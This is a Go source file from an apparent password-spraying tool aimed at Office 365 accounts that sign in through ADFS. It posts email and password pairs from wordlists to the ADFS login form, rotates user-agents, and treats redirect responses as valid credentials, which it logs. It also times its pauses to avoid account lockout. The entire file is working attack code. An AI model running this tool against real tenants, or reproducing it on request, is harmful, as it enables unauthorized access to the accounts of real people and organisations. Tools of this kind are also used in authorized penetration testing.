package spray

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/securebinary/o365sprayer/o365sprayer/constants"
	"github.com/securebinary/o365sprayer/o365sprayer/logging"
)

func SprayADFSO365(
	domainName string,
	authURL string,
	email string,
	password string,
	command string,
	file *os.File,
) {
	adfsLogin := url.Values{}
	adfsLogin.Add("AuthMethod", "FormsAuthentication")
	adfsLogin.Add("UserName", email)
	adfsLogin.Add("Password", password)
	loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}}
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == 302 {
		go sprayCounter()
		color.Green("[+] Valid Credential : " + email + " - " + password)
		logging.LogSprayedAccount(file, email, password)
	}
	if resp.StatusCode != 302 && command == "standalone" {
		color.Red("[+] Invalid Credential : " + email + " - " + password)
	}
}

func SprayEmailsADFSO365(
	domainName string,
	authURL string,
	email string,
	emailFilePath string,
	password string,
	passwordFilePath string,
	delay float64,
	lockout int,
	lockoutDelay int,
	maxLockouts int,
) {
	color.Yellow("[+] Spraying For O365 Emails - ADFS")
	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
	fileName := domainName + "_spray_" + timeStamp
	logFile, err := os.OpenFile((fileName), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Could not open " + fileName)
		return
	}
	defer logFile.Close()
	if len(email) > 0 {
		if len(password) > 0 {
			SprayADFSO365(
				domainName,
				authURL,
				email,
				password,
				"standalone",
				logFile,
			)
		}
		if len(password) == 0 && len(passwordFilePath) > 0 {
			var lockoutCount = 0
			file, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 0
				}
				lockoutCount += 1
				SprayADFSO365(
					domainName,
					authURL,
					email,
					scanner.Text(),
					"file",
					logFile,
				)
				time.Sleep(time.Duration(delay))
			}
			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
	}
	if len(email) == 0 && len(emailFilePath) > 0 {
		if len(password) > 0 {
			file, err := os.Open(emailFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				SprayADFSO365(
					domainName,
					authURL,
					scanner.Text(),
					password,
					"file",
					logFile,
				)
				time.Sleep(time.Duration(delay))
			}
			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
		if len(password) == 0 && len(passwordFilePath) > 0 {
			lockoutCount := 0
			passFile, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer passFile.Close()
			passScanner := bufio.NewScanner(passFile)
			for passScanner.Scan() {
				if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 1
				}
				lockoutCount += 1
				emailFile, err := os.Open(emailFilePath)
				if err != nil {
					log.Fatal(err)
				}
				defer emailFile.Close()
				emailScanner := bufio.NewScanner(emailFile)
				for emailScanner.Scan() {
					SprayADFSO365(
						domainName,
						authURL,
						emailScanner.Text(),
						passScanner.Text(),
						"file",
						logFile,
					)
					time.Sleep(time.Duration(delay))
				}
				if err := emailScanner.Err(); err != nil {
					log.Fatal(err)
				}
			}
			if err := passScanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
	}
}
